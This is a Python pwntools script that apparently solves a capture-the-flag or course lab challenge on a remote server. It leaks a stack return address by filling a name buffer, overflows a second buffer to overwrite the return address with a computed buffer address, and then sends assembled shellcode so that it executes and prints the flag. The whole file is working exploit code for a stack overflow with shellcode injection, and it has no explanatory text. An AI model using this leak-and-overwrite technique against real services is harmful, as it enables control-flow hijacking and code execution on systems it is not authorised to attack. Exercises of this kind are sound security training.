from pwn import asm, remote

OFFSET_BUF1_TO_RETURN_ADDR = 0x38
OFFSET_BUF2_TO_RETURN_ADDR = OFFSET_BUF1_TO_RETURN_ADDR + 0x30
OFFSET_RETURN_ADDR_TO_MSG = 0xE5587


def solve(r: remote, data: bytes):
    r.recvuntil(b"What's your name? ")

    # leak the return address
    msg = b"A" * (OFFSET_BUF1_TO_RETURN_ADDR - 1)
    r.sendline(msg)
    ret_addr = int.from_bytes(r.recvlinesb(2)[1], byteorder="little")
    print(f"original return address: 0x{ret_addr:x}")

    r.recvuntil(b"What's the room number? ")

    # calculate the absolute address of msg buffer based on the return address
    msg_addr = ret_addr + OFFSET_RETURN_ADDR_TO_MSG
    print(f"msg buffer address: 0x{msg_addr:x}")

    # modify the return address
    msg = b"A" * OFFSET_BUF2_TO_RETURN_ADDR
    r.sendline(msg + msg_addr.to_bytes(8, byteorder="little"))

    r.recvuntil(b"The room number is: ")

    # check if the new return address is correct
    new_ret_addr = r.recvline(keepends=False)[OFFSET_BUF2_TO_RETURN_ADDR:]
    new_ret_addr = int.from_bytes(new_ret_addr, byteorder="little")
    print(f"new return address: 0x{new_ret_addr:x}")

    r.recvuntil(b"What's the customer's name? ")
    r.sendline()

    r.recvuntil(b"Leave your message: ")
    r.sendline(data)
    r.recvline()

    msg = r.recvuntil(b"}").decode()
    print(msg)

    r.close()


if __name__ == "__main__":
    with open("./chal_1.asm") as f:
        content = f.read()

    data = asm(content, arch="amd64", os="linux")
    print("Length of the shellcode: ", len(data))

    ## for remote access
    r = remote("up.zoolab.org", 12342)
    solve(r, data)
